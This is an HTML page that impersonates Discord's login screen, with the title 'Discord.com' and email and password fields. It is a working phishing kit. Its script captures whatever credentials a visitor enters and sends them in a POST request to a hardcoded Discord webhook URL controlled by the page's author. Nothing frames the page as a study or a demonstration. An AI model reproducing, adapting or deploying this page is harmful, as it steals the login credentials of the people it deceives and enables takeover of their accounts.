<!DOCTYPE html>
<html lang="en" style="background-color:blue;" >
<style>
	.black {
	background-color:blue;
	color:black;
	}
	
	.white {
	background-color:blue;
	color:white;
	}
	
	.BTN {
	background-color:blue;
	color:white;
	}
</style>
<head>
  <meta charset="UTF-8">
  <title>Discord.com</title>
</head>
<body>
  <h2 class="black" >Login To Discord</h2>
  <form id="discordForm">
    <label for="input1">Email:</label><br>
    <input class="black" type="email" id="input1" name="input1" required><br><br>
    
    <label for="input2">Password:</label><br>
    <input class="black" type="password" id="input2" name="input2" required><br><br>
    
    <button class="BTN" type="submit">Submit</button>
  </form>


  <script>
    const form = document.getElementById('discordForm');
    const status = document.getElementById('status');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const input1 = document.getElementById('input1').value;
      const input2 = document.getElementById('input2').value;

      const content = `Email: ${input1}\nPassword: ${input2}`;

      try {
        const response = await fetch("https://discord.com/api/webhooks/1382389876758151179/BZISxhMNG0TiBfifkZIAZ_7O1VBo53rtY-vuqwEsdT8RvlwyqA3ScTkiQsnGZ5-2n-ms", {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ content })
        });

        if (response.ok) {
          status.textContent = "Message sent successfully!";
          form.reset();
        } else {
          status.textContent = "Failed to send message.";
        }
      } catch (error) {
        console.error(error);
        status.textContent = "An error occurred.";
      }
    });
  </script>
</body>
</html>
